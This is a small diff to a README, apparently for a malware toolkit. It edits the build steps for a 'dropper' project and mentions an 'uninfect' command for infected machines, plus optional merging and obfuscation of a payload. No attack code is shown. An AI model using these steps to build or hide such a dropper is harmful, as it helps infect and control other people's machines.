@@ -33,7 +33,7 @@ uninfect : Uninfect specified machine.
 
 ## How to build
 1. Specify the token and other variables in the dropper project Program.cs.
-2. Build the dropper project.
+2. Build the dropper project as x64.
 
 Optional: Build the payload project and merge/embed all the dlls + obfuscate the output assembly. Replace payload.exe in the dropper project with your new payload.
 
